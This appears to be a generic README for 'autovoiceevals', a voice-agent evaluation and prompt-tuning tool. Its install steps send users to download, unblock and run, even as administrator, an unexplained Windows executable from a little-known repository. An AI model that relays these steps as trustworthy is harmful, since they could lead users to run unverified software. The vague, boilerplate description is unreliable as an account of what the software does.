# 🤖 autovoiceevals - Improve voice agents with each run

[![Download / Install](https://img.shields.io/badge/Download%20on-GitHub-blue?style=for-the-badge&logo=github)](https://github.com/guglielmawoodfired788/autovoiceevals)

## 🧭 What this is

autovoiceevals is a tool for testing and improving voice AI agents. It uses a loop that checks how the agent performs, then helps refine the prompt and setup for the next run.

It is built for people who want better voice results without having to edit every part by hand each time.

## 💻 What you need

- A Windows PC
- A modern web browser
- Enough free space for the app files and test data
- A stable internet connection if the app uses online AI services
- A microphone if you plan to test voice input

For best results, use Windows 10 or Windows 11.

## 📥 Download

Visit this page to download and run the app files:

https://github.com/guglielmawoodfired788/autovoiceevals

## 🪟 Install on Windows

1. Open the download page in your browser.
2. Find the latest release or download option.
3. Download the Windows file or package.
4. If the file is in a zip folder, right-click it and choose Extract All.
5. Open the extracted folder.
6. If you see an app file, double-click it to run.
7. If Windows asks for permission, choose Yes.
8. If the app opens in a browser, keep the window open while you use it.

If the app comes with a setup file, run that file first, then open the app from the Start menu or desktop icon.

## 🎙️ What it does

autovoiceevals helps you:

- Test voice agent replies
- Compare different prompt versions
- Spot weak parts in the agent flow
- Track changes over time
- Build a better system prompt for voice use
- Run repeat tests with the same input
- Use autoresearch-style loops to guide changes

It fits voice AI work where you want the agent to sound more natural, stay on task, and handle more cases well.

## 🧩 Main parts

### 🔍 Evaluation loop
The app checks how the voice agent performs against test cases. This helps you see what works and what needs work.

### 🗣️ Voice agent testing
You can use it to test speech-based responses and dialog flow.

### 🧠 Prompt tuning
The app supports system-prompt optimization, so you can improve the instructions that guide the agent.

### 📊 Result tracking
It keeps results in a way that makes it easier to compare runs and see progress.

### 🤖 Research-based workflow
The project uses karpathy’s autoresearch as a base, so the process follows a repeatable test, learn, improve loop.

## 🚀 First run

1. Open the app.
2. Let it load fully before you start a test.
3. Pick a voice agent or test setup.
4. Add a test case or use the sample set.
5. Run the evaluation.
6. Review the output.
7. Adjust the prompt or settings.
8. Run it again to compare results.

If the app offers a sample profile, start with that first. It gives you a simple way to see how the loop works.

## 🛠️ Basic setup

After install, check these common settings:

- Choose your voice model
- Set the agent prompt
- Pick the test set
- Turn on logging if you want to review results
- Set the output folder for saved runs

If you use an external voice API, make sure your API key is entered in the app settings or config file.

## 🧪 How to use it

1. Launch autovoiceevals.
2. Open the test or eval screen.
3. Load a voice agent setup.
4. Choose a prompt version to test.
5. Start the run.
6. Wait for the results to finish.
7. Review the score or notes.
8. Make one change at a time.
9. Run the test again.

This works best when you change one thing, then test again. That makes it easier to see what helped.

## 📁 File layout

A typical setup may include:

- `config` for app settings
- `runs` for saved test results
- `prompts` for prompt versions
- `data` for test inputs
- `logs` for run history

If the app creates these folders on its own, you can leave them as they are.

## 🔐 Privacy and keys

If you connect the app to a cloud AI service, you may need an API key. Keep that key private. Do not share it in public posts or screenshots.

If the app stores local files, you can back them up by copying the project folder or export files to another location.

## 🧰 Troubleshooting

### The app does not open
- Try running it as an administrator
- Check that the file finished downloading
- Move the folder to a simple path like `C:\autovoiceevals`

### Windows blocks the app
- Right-click the file
- Open Properties
- If you see an Unblock option, select it
- Try opening the app again

### Nothing happens after launch
- Wait a few seconds for the app to load
- Close and reopen it
- Check that no other copy is already running

### Voice input does not work
- Check your microphone connection
- Make sure Windows has microphone access turned on
- Choose the correct input device in the app settings

### Results look wrong
- Recheck the prompt
- Make sure the test case is set up well
- Run the same test again before changing more settings

## 🧭 Best way to get good results

- Start with a small test set
- Keep your prompt changes simple
- Test the same cases each time
- Save each run
- Compare before and after
- Use clear, short agent goals
- Remove instructions that conflict with each other

This gives you cleaner results and makes it easier to improve the agent step by step

## 🧑‍💻 Topic focus

This project is built around:

- autoresearch
- claude
- smallest-ai
- system prompt optimization
- voice agents
- voice AI

It fits users who want a practical way to improve voice agent behavior with repeatable tests and prompt changes

## 📌 Repository

Primary download page:

https://github.com/guglielmawoodfired788/autovoiceevals